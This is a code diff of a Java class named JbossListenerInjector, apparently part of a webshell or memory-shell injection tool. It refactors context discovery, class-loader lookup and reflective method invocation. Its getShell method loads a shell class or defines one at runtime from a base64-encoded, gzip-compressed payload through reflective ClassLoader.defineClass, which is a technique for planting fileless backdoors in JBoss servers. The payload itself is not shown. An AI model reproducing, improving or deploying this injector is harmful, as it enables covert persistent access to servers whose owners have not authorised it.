@@ -47,32 +47,34 @@ public class JbossListenerInjector {
                 Collection<?> values = childrenMap.values();
                 for (Object value : values) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
-                    for (Object context : children.values()) {
-                        contexts.add(context);
-                    }
+                    contexts.addAll(children.values());
                 }
             }
         }
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object loader = invokeMethod(context, "getLoader", null, null);
+            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        Object obj;
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
-            obj = classLoader.loadClass(getClassName()).newInstance();
+            return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            obj = clazz.newInstance();
+            return clazz.newInstance();
         }
-        return obj;
     }
 
     @SuppressWarnings("all")
@@ -179,24 +181,28 @@ public class JbossListenerInjector {
     }
 
     @SuppressWarnings("all")
-    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
-        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
-        Method method = null;
-        while (clazz != null && method == null) {
-            try {
-                if (paramClazz == null) {
-                    method = clazz.getDeclaredMethod(methodName);
-                } else {
-                    method = clazz.getDeclaredMethod(methodName, paramClazz);
+    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
+        try {
+            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
+            Method method = null;
+            while (clazz != null && method == null) {
+                try {
+                    if (paramClazz == null) {
+                        method = clazz.getDeclaredMethod(methodName);
+                    } else {
+                        method = clazz.getDeclaredMethod(methodName, paramClazz);
+                    }
+                } catch (NoSuchMethodException e) {
+                    clazz = clazz.getSuperclass();
                 }
-            } catch (NoSuchMethodException e) {
-                clazz = clazz.getSuperclass();
             }
+            if (method == null) {
+                throw new NoSuchMethodException("Method not found: " + methodName);
+            }
+            method.setAccessible(true);
+            return method.invoke(obj instanceof Class ? null : obj, param);
+        } catch (Exception e) {
+            throw new RuntimeException("Error invoking method: " + methodName, e);
         }
-        if (method == null) {
-            throw new NoSuchMethodException("Method not found: " + methodName);
-        }
-        method.setAccessible(true);
-        return method.invoke(obj instanceof Class ? null : obj, param);
     }
 }
